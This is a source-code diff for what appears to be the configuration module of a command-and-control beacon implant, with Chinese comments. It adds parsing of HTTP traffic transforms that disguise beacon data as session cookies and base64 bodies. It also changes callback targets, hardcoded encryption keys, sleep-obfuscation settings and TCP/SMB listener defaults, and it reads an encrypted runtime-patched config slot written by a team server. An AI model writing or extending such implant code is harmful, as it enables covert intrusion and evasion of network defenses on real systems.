@@ -30,8 +30,6 @@
 #define CFG_HTTP_SSL 105u
 #define CFG_HTTP_METHOD 106u
 #define CFG_HTTP_RESPONSE_HEADERS 107u
-#define CFG_HTTP_HB_HEADER 108u
-#define CFG_HTTP_HB_PREFIX 109u
 #define CFG_HTTP_ENCRYPT_KEY 110u
 #define CFG_HTTP_HOST_HEADER 111u
 #define CFG_HTTP_USER_AGENT 112u
@@ -39,6 +37,7 @@
 #define CFG_HTTP_SSL_CERT 114u
 #define CFG_HTTP_SSL_KEY 115u
 #define CFG_HTTP_CALLBACK_HOST 116u
+#define CFG_HTTP_TRANSFORM 117u
 #define CFG_TCP_BIND_HOST 200u
 #define CFG_TCP_BIND_PORT 201u
 #define CFG_TCP_CONNECT_TIMEOUT 202u
@@ -50,6 +49,15 @@
 #define CFG_TCP_ENCRYPT_KEY 225u
 #define CFG_SMB_PIPE_NAME 210u
 #define CFG_SMB_CONNECT_TIMEOUT 211u
+
+#define CFG_VALUE_BYTES 1u
+#define HTTP_TRANSFORM_VERSION 1u
+#define HTTP_TRANSFORM_LOC_BODY 1u
+#define HTTP_TRANSFORM_LOC_HEADER 2u
+#define HTTP_TRANSFORM_ENC_RAW 1u
+#define HTTP_TRANSFORM_ENC_BASE64 2u
+#define HTTP_TRANSFORM_OUT_BINARY 1u
+#define HTTP_TRANSFORM_OUT_PRINT 2u
 
 /* 运行时可修补的配置槽（由 server 端 TSCF 写入） */
 __declspec(align(16)) BYTE8 g_BeaconProfilePatchSlot[PROFILE_PATCH_SLOT_SIZE] = {
@@ -63,21 +71,6 @@ typedef struct ProfilePatchTarget {
     INT port;
     INT has_port;
 } ProfilePatchTarget;
-
-/* 从字节流读取大端序 16 位整数 */
-static UINT16 ReadBe16(const BYTE8* p)
-{
-    return (UINT16)(((UINT16)p[0] << 8) | (UINT16)p[1]);
-}
-
-/* 从字节流读取大端序 32 位整数 */
-static UINT32 ReadBe32(const BYTE8* p)
-{
-    return ((UINT32)p[0] << 24) |
-           ((UINT32)p[1] << 16) |
-           ((UINT32)p[2] << 8)  |
-           (UINT32)p[3];
-}
 
 /* 计算 CRC-32 校验和 */
 static UINT32 ProfileCrc32(const BYTE8* data, SIZE_T len)
@@ -211,10 +204,10 @@ static VOID ApplySleepImageLayout(Profile* p, const BYTE8* value, UINT32 value_l
 
     if (!p || !value || value_len != 16u) return;
 
-    image_size = ReadBe32(value);
-    text_rva = ReadBe32(value + 4);
-    text_size = ReadBe32(value + 8);
-    text_protect = ReadBe32(value + 12);
+    image_size = BeReadU32(value);
+    text_rva = BeReadU32(value + 4);
+    text_size = BeReadU32(value + 8);
+    text_protect = BeReadU32(value + 12);
 
     if (image_size == 0 || text_size == 0 || text_rva >= image_size ||
         text_size > image_size - text_rva) {
@@ -228,6 +221,115 @@ static VOID ApplySleepImageLayout(Profile* p, const BYTE8* value, UINT32 value_l
     p->sleep_layout.text_protect = text_protect ? text_protect : PAGE_EXECUTE_READ;
 }
 
+typedef struct TransformReader {
+    const BYTE8* data;
+    UINT32 len;
+    UINT32 off;
+} TransformReader;
+
+static INT TransformReadU8(TransformReader* r, UINT8* out)
+{
+    if (!r || !out || r->off >= r->len) {
+        return 0;
+    }
+    *out = r->data[r->off++];
+    return 1;
+}
+
+static INT TransformReadU16Be(TransformReader* r, UINT16* out)
+{
+    if (!r || !out || r->len - r->off < 2u) {
+        return 0;
+    }
+    *out = BeReadU16(r->data + r->off);
+    r->off += 2u;
+    return 1;
+}
+
+static INT TransformReadStringU16(TransformReader* r, CHAR* dst, SIZE_T dst_len)
+{
+    UINT16 len;
+    SIZE_T copy_len;
+
+    if (!r || !dst || dst_len == 0 || !TransformReadU16Be(r, &len)) {
+        return 0;
+    }
+    if ((UINT32)len > r->len - r->off) {
+        return 0;
+    }
+
+    ZeroMemory(dst, dst_len);
+    copy_len = len;
+    if (copy_len >= dst_len) {
+        copy_len = dst_len - 1;
+    }
+    if (copy_len) {
+        memcpy(dst, r->data + r->off, copy_len);
+    }
+    r->off += len;
+    return 1;
+}
+
+static INT ParseHttpTransform(TransformReader* r, HttpDataTransform* out)
+{
+    if (!r || !out) {
+        return 0;
+    }
+
+    ZeroMemory(out, sizeof(*out));
+    if (!TransformReadU8(r, &out->present) ||
+        !TransformReadU8(r, &out->location) ||
+        !TransformReadU8(r, &out->encoding) ||
+        !TransformReadU8(r, &out->output_mode) ||
+        !TransformReadStringU16(r, out->name, sizeof(out->name)) ||
+        !TransformReadStringU16(r, out->prefix, sizeof(out->prefix)) ||
+        !TransformReadStringU16(r, out->suffix, sizeof(out->suffix))) {
+        return 0;
+    }
+
+    return 1;
+}
+
+static INT ParseHttpMethodTransform(TransformReader* r, HttpMethodTransform* out)
+{
+    if (!r || !out) {
+        return 0;
+    }
+
+    return ParseHttpTransform(r, &out->metadata) &&
+           ParseHttpTransform(r, &out->stage_output) &&
+           ParseHttpTransform(r, &out->server_output);
+}
+
+/* 解析 CfgHTTPTransform 的二进制 block。失败时保留 present=1，禁止静默回退旧协议。 */
+static INT ParseHttpTransformBlock(HttpTransformConfig* out, const BYTE8* data, UINT32 data_len)
+{
+    TransformReader r;
+    UINT16 version;
+
+    if (!out || !data) {
+        return 0;
+    }
+
+    ZeroMemory(out, sizeof(*out));
+    out->present = 1;
+    r.data = data;
+    r.len = data_len;
+    r.off = 0;
+
+    if (!TransformReadU16Be(&r, &version) || version != HTTP_TRANSFORM_VERSION) {
+        return 0;
+    }
+    out->version = version;
+
+    if (!ParseHttpMethodTransform(&r, &out->get) ||
+        !ParseHttpMethodTransform(&r, &out->post)) {
+        return 0;
+    }
+
+    return r.off == r.len;
+}
+
 /* 解析 TLV 格式的配置数据并填充 Profile */
 static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
 {
@@ -237,8 +339,9 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
     ZeroMemory(&target, sizeof(target));
 
     while (offset + 8u <= data_len) {
-        UINT16 tag = ReadBe16(data + offset);
-        UINT32 value_len = ReadBe32(data + offset + 4);
+        UINT16 tag = BeReadU16(data + offset);
+        UINT8 value_type = data[offset + 2];
+        UINT32 value_len = BeReadU32(data + offset + 4);
         const BYTE8* value;
 
         offset += 8u;
@@ -263,17 +366,17 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
             CopyTlvString(p->format, sizeof(p->format), value, value_len);
             break;
         case CFG_SLEEP_TIME:
-            if (value_len == 4) p->sleep_ms = (INT)ReadBe32(value);
+            if (value_len == 4) p->sleep_ms = (INT)BeReadU32(value);
             break;
         case CFG_JITTER:
-            if (value_len == 4) p->jitter = (INT)ReadBe32(value);
+            if (value_len == 4) p->jitter = (INT)BeReadU32(value);
             break;
         case CFG_SLEEP_OBF_ENABLED:
             if (value_len > 0) p->sleep_obf_enabled = value[0] != 0;
             break;
         case CFG_SLEEP_OBF_TECHNIQUE:
             if (value_len == 4) {
-                p->sleep_obf_technique = (SleepObfTechnique)ReadBe32(value);
+                p->sleep_obf_technique = (SleepObfTechnique)BeReadU32(value);
             } else if (value_len > 0) {
                 p->sleep_obf_technique = (SleepObfTechnique)value[0];
             }
@@ -286,10 +389,10 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
             break;
         case CFG_HTTP_PORT:
             if (value_len == 4) {
-                target.port = (INT)ReadBe32(value);
+                target.port = (INT)BeReadU32(value);
                 target.has_port = 1;
             } else if (value_len == 2) {
-                target.port = (INT)ReadBe16(value);
+                target.port = (INT)BeReadU16(value);
                 target.has_port = 1;
             }
             break;
@@ -300,26 +403,26 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
             CopyTlvString(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), value, value_len);
             break;
         case CFG_TCP_BIND_PORT:
-            if (value_len == 4) p->tcp_internal.bind_port = (INT)ReadBe32(value);
+            if (value_len == 4) p->tcp_internal.bind_port = (INT)BeReadU32(value);
             break;
         case CFG_TCP_CONNECT_TIMEOUT:
-            if (value_len == 4) p->tcp_internal.connect_timeout_ms = (INT)ReadBe32(value);
+            if (value_len == 4) p->tcp_internal.connect_timeout_ms = (INT)BeReadU32(value);
             break;
         case CFG_SMB_PIPE_NAME:
             CopyTlvString(p->smb_internal.pipe_name, sizeof(p->smb_internal.pipe_name), value, value_len);
             break;
         case CFG_SMB_CONNECT_TIMEOUT:
-            if (value_len == 4) p->smb_internal.connect_timeout_ms = (INT)ReadBe32(value);
+            if (value_len == 4) p->smb_internal.connect_timeout_ms = (INT)BeReadU32(value);
             break;
         case CFG_HTTP_URI:
             CopyTlvString(p->http.uri, sizeof(p->http.uri), value, value_len);
             NormalizeUri(p->http.uri, sizeof(p->http.uri));
             break;
         case CFG_HTTP_RECONNECT_COUNT:
-            if (value_len == 4) p->http.reconnect_count = (INT)ReadBe32(value);
+            if (value_len == 4) p->http.reconnect_count = (INT)BeReadU32(value);
             break;
         case CFG_HTTP_RECONNECT_TIME:
-            if (value_len == 4) p->http.reconnect_time_ms = (INT)ReadBe32(value);
+            if (value_len == 4) p->http.reconnect_time_ms = (INT)BeReadU32(value);
             break;
         case CFG_HTTP_SSL:
             if (value_len > 0) p->http.ssl = value[0] != 0;
@@ -330,27 +433,27 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
         case CFG_HTTP_RESPONSE_HEADERS:
             CopyTlvString(p->http.response_headers, sizeof(p->http.response_headers), value, value_len);
             break;
-        case CFG_HTTP_HB_HEADER:
-            CopyTlvString(p->http.hb_header, sizeof(p->http.hb_header), value, value_len);
-            break;
-        case CFG_HTTP_HB_PREFIX:
-            CopyTlvString(p->http.hb_prefix, sizeof(p->http.hb_prefix), value, value_len);
-            break;
         case CFG_HTTP_ENCRYPT_KEY:
             CopyTlvString(p->http.encrypt_key, sizeof(p->http.encrypt_key), value, value_len);
             CopyTlvString(p->encrypt_key, sizeof(p->encrypt_key), value, value_len);
+            break;
+        case CFG_HTTP_TRANSFORM:
+            p->http.transform.present = 1;
+            if (value_type == CFG_VALUE_BYTES) {
+                ParseHttpTransformBlock(&p->http.transform, value, value_len);
+            }
             break;
         case CFG_TCP_CALLBACK_HOST:
             CopyTlvString(p->tcp_external.callback_host, sizeof(p->tcp_external.callback_host), value, value_len);
             break;
         case CFG_TCP_CALLBACK_PORT:
-            if (value_len == 4) p->tcp_external.callback_port = (INT)ReadBe32(value);
+            if (value_len == 4) p->tcp_external.callback_port = (INT)BeReadU32(value);
             break;
         case CFG_TCP_RECONNECT_COUNT:
-            if (value_len == 4) p->tcp_external.reconnect_count = (INT)ReadBe32(value);
+            if (value_len == 4) p->tcp_external.reconnect_count = (INT)BeReadU32(value);
             break;
         case CFG_TCP_RECONNECT_TIME:
-            if (value_len == 4) p->tcp_external.reconnect_time_ms = (INT)ReadBe32(value);
+            if (value_len == 4) p->tcp_external.reconnect_time_ms = (INT)BeReadU32(value);
             break;
         case CFG_TCP_SSL:
             if (value_len > 0) p->tcp_external.ssl = value[0] != 0;
@@ -383,6 +486,74 @@ static INT ParseProfileTlv(Profile* p, const BYTE8* data, UINT32 data_len)
     return offset == data_len;
 }
 
+static VOID SetHttpTransform(HttpDataTransform* t,
+                             UINT8 location,
+                             UINT8 encoding,
+                             UINT8 output_mode,
+                             const CHAR* name,
+                             const CHAR* prefix)
+{
+    ZeroMemory(t, sizeof(*t));
+    t->present = 1;
+    t->location = location;
+    t->encoding = encoding;
+    t->output_mode = output_mode;
+    if (name && name[0]) {
+        strcpy_s(t->name, sizeof(t->name), name);
+    }
+    if (prefix && prefix[0]) {
+        strcpy_s(t->prefix, sizeof(t->prefix), prefix);
+    }
+}
+
+/* DebugExe 默认 profile 与 TeamServer c2profile/http-default.yaml 保持一致。 */
+static VOID SetDefaultHttpTransform(Profile* p)
+{
+    HttpTransformConfig* transform = &p->http.transform;
+
+    ZeroMemory(transform, sizeof(*transform));
+    transform->present = 1;
+    transform->version = HTTP_TRANSFORM_VERSION;
+
+    SetHttpTransform(&transform->get.metadata,
+                     HTTP_TRANSFORM_LOC_HEADER,
+                     HTTP_TRANSFORM_ENC_BASE64,
+                     0,
+                     "Cookie",
+                     "SESSIONID=");
+    SetHttpTransform(&transform->get.stage_output,
+                     HTTP_TRANSFORM_LOC_BODY,
+                     HTTP_TRANSFORM_ENC_RAW,
+                     HTTP_TRANSFORM_OUT_BINARY,
+                     NULL,
+                     NULL);
+    SetHttpTransform(&transform->get.server_output,
+                     HTTP_TRANSFORM_LOC_BODY,
+                     HTTP_TRANSFORM_ENC_RAW,
+                     HTTP_TRANSFORM_OUT_BINARY,
+                     NULL,
+                     NULL);
+
+    SetHttpTransform(&transform->post.metadata,
+                     HTTP_TRANSFORM_LOC_HEADER,
+                     HTTP_TRANSFORM_ENC_BASE64,
+                     0,
+                     "Cookie",
+                     "JSESSION=");
+    SetHttpTransform(&transform->post.stage_output,
+                     HTTP_TRANSFORM_LOC_BODY,
+                     HTTP_TRANSFORM_ENC_BASE64,
+                     HTTP_TRANSFORM_OUT_PRINT,
+                     NULL,
+                     NULL);
+    SetHttpTransform(&transform->post.server_output,
+                     HTTP_TRANSFORM_LOC_BODY,
+                     HTTP_TRANSFORM_ENC_BASE64,
+                     HTTP_TRANSFORM_OUT_PRINT,
+                     NULL,
+                     NULL);
+}
+
 /* 从全局 patch slot 读取、解密并应用 TSCF v2 配置 */
 static INT ApplyPatchedProfile(Profile* p)
 {
@@ -405,22 +576,22 @@ static INT ApplyPatchedProfile(Profile* p)
         return 0;
     }
 
-    version = ReadBe16(slot + 4);
+    version = BeReadU16(slot + 4);
     if (version != PROFILE_PATCH_VERSION) {
         return 0;
     }
 
-    flags = ReadBe16(slot + 6);
+    flags = BeReadU16(slot + 6);
     if (flags != PROFILE_PATCH_FLAG_XOR) {
         return 0;
     }
 
-    config_len = ReadBe32(slot + 8);
+    config_len = BeReadU32(slot + 8);
     if (config_len == 0 || config_len > PROFILE_PATCH_SLOT_SIZE - PROFILE_PATCH_HEADER_SIZE) {
         return 0;
     }
 
-    expected_crc = ReadBe32(slot + 12);
+    expected_crc = BeReadU32(slot + 12);
     key = slot + 16;
     encrypted = slot + PROFILE_PATCH_HEADER_SIZE;
 
@@ -457,8 +628,8 @@ VOID ProfileLoad(Profile* p)
     p->sleep_ms = 5000;
     p->jitter = 20;
     p->conn_timeout_sec = 10;
-    p->sleep_obf_enabled = TRUE;
-    //p->sleep_obf_enabled = FALSE;
+    //p->sleep_obf_enabled = TRUE;
+    p->sleep_obf_enabled = FALSE;
     p->sleep_obf_technique = SLEEP_OBF_GARGLE;
 
     strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-http");
@@ -467,15 +638,14 @@ VOID ProfileLoad(Profile* p)
     strcpy_s(p->format, sizeof(p->format), "http");
 
     /* HTTP 传输配置 */
-    strcpy_s(p->http.method, sizeof(p->http.method), "GET");
-    strcpy_s(p->http.target, sizeof(p->http.target), "192.168.18.1:9999");
+    strcpy_s(p->http.method, sizeof(p->http.method), "POST");
+    strcpy_s(p->http.target, sizeof(p->http.target), "127.0.0.1:4444");
     strcpy_s(p->http.uri, sizeof(p->http.uri), "/index.php");
-    strcpy_s(p->http.hb_header, sizeof(p->http.hb_header), "Cookie");
-    strcpy_s(p->http.hb_prefix, sizeof(p->http.hb_prefix), "SESSIONID=");
     strcpy_s(p->http.user_agent, sizeof(p->http.user_agent), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
     strcpy_s(p->http.content_type, sizeof(p->http.content_type), "application/octet-stream");
-    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "4d137aadf252d2f89dd46173ab54ef8f");
+    strcpy_s(p->http.encrypt_key, sizeof(p->http.encrypt_key), "c43e5151e7dff986d2f42c9de108cb03");
     strcpy_s(p->encrypt_key, sizeof(p->encrypt_key), p->http.encrypt_key);
+    SetDefaultHttpTransform(p);
 
     /* SSL 和重连策略 */
     p->http.ssl = 0;
@@ -487,7 +657,7 @@ VOID ProfileLoad(Profile* p)
     p->tcp_external.reconnect_count = 3;
     p->tcp_external.reconnect_time_ms = 3000;
     p->tcp_external.ssl = 1;
-    strcpy_s(p->tcp_external.encrypt_key, sizeof(p->tcp_external.encrypt_key), p->encrypt_key);
+    strcpy_s(p->tcp_external.encrypt_key, sizeof(p->tcp_external.encrypt_key), "4d137aadf252d2f89dd46173ab54ef8f");
 
     strcpy_s(p->tcp_internal.bind_host, sizeof(p->tcp_internal.bind_host), "0.0.0.0");
     p->tcp_internal.bind_port = 4444;
@@ -501,6 +671,7 @@ VOID ProfileLoad(Profile* p)
     strcpy_s(p->listener_type, sizeof(p->listener_type), "external");
     strcpy_s(p->protocol, sizeof(p->protocol), "tcp");
     strcpy_s(p->format, sizeof(p->format), "tcp");
+    strcpy_s(p->encrypt_key, sizeof(p->encrypt_key), p->tcp_external.encrypt_key);
 #elif defined(BEACON_INTERNAL_TCP_BUILD)
     strcpy_s(p->listener_name, sizeof(p->listener_name), "debug-tcp-internal");
     strcpy_s(p->listener_type, sizeof(p->listener_type), "internal");
